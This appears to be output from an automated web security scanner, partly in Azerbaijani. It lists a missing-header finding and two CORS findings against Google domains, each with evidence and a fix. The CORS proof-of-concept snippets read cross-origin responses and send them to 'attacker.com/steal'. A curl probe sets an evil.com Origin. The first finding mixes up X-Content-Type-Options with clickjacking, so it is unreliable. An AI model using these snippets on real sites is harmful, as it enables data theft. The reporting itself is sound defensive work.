LOW Missing X-Content-Type-Options — CVSS 3.7

🔗 https://google.com
Vulnerable to MIME sniffing attacks.
🔍 Evidence 
Header 'x-content-type-options' not in response
💥 PoC / Exploitation 
Attacker can exploit the missing header. For example, without X-Frame-Options: clickjacking via <iframe src='https://google.com'></iframe>.
🛠 Remediation 
Add header: X-Content-Type-Options: nosniff

MEDIUM CORS Wildcard Origin — CVSS 5.4

🔗 https://blog.google.com
Access-Control-Allow-Origin: * təyin edilib. İstənilən sayt bu endpoint-ə cross-origin request edə bilər.
🔍 Evidence 
Access-Control-Allow-Origin: *
💥 PoC / Exploitation 
Sensitive data endpoint-i varsa:
fetch('https://target.com/api/data')
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?d='+JSON.stringify(d)))
🛠 Remediation 
Wildcard əvəzinə konkret origin siyahısı tətbiq et:
Access-Control-Allow-Origin: https://yourdomain.com
📚 References 
https://portswigger.net/web-security/cors

MEDIUM CORS Arbitrary Origin Reflection — CVSS 6.5

🔗 https://blog.google.com
Server göndərilən Origin-i (https://evil.com) olduğu kimi reflect edir.
🔍 Evidence 
Request Origin: https://evil.com
Response ACAO: https://evil.com
Allow-Credentials: False
💥 PoC / Exploitation 
Attacker saytından:

var req = new XMLHttpRequest();
req.open('GET', 'https://blog.google.com', true);
req.onload = function() {
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(this.responseText));
};
req.send();
🖥 cURL PoC 
curl -H "Origin: https://evil.com" -I "https://blog.google.com" | grep -i "access-control"
🛠 Remediation 
1. Origin whitelist yaradın — dinamik reflection etmə
2. Credentials istifadə edirsənsə wildcard/arbitrary origin qadağan et
3. Add Vary: Origin header for cache poisoning
📚 References 
https://portswigger.net/web-security/cors
